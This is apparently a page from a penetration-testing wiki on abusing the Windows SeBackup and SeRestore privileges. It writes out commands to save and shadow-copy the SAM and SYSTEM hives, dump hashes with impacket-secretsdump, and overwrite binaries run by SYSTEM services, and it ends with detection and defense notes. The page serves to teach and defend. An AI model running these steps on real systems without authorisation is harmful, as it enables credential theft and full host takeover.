# SeBackup and SeRestore Abuse

`SeBackupPrivilege` lets a token **read any file on the system regardless of its ACL**, and `SeRestorePrivilege` lets it **write any file** the same way — both by opening handles with the `FILE_FLAG_BACKUP_SEMANTICS` backup intent. They are held by the Backup Operators group and some service contexts. With SeBackup you can copy the SAM and SYSTEM hives (normally locked and ACL-protected) and crack or pass the local Administrator hash offline; with SeRestore you can overwrite a binary a SYSTEM service runs.

## Confirm the privilege

```cmd
whoami /priv | findstr /i "SeBackup SeRestore"
```

## SeBackup — steal the SAM & SYSTEM hives

The live registry hives are locked, but a backup-semantics read or a shadow copy sidesteps that. Simplest route via `reg save` (works when running with the privilege):

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

Or use the `diskshadow` + `robocopy /b` (backup mode) technique to copy locked files:

```cmd
diskshadow /s script.txt
robocopy /b Z:\Windows\System32\config C:\Windows\Temp SAM SYSTEM
```

Then exfiltrate and dump offline on the attacker box:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Crack or pass the recovered local Administrator hash → Pass The Hash Attack, Password Cracking.

## SeRestore — overwrite a privileged binary

With arbitrary write, replace a file a SYSTEM service or auto-run executes (e.g. a service `binPath`, or hijack a DLL), then restart the service. Detailed service mechanics: [Services Exploitation](../Services-Exploitation/Services-Exploitation.md).

## Detection and defenses

- **Detection:** `reg save`/`diskshadow`/`robocopy /b` targeting `\config\SAM`, Event ID 4674, unexpected Backup Operators membership.
- **Defenses:** treat Backup Operators as tier-0; restrict `SeBackupPrivilege`/`SeRestorePrivilege`; alert on SAM/SYSTEM hive access.

## Related
- [Token Privilege Abuse](Token-Privilege-Abuse.md) — hub mapping every dangerous privilege
- [SAM and SYSTEM files](../Password-Mining/SAM-and-SYSTEM-files.md) — dumping and cracking the recovered hives
- [NTDS.DIT Active Directory Domain](../Password-Mining/NTDS.DIT-Active-Directory-Domain.md) — the domain-controller equivalent
- Pass The Hash Attack — use the recovered hash without cracking it
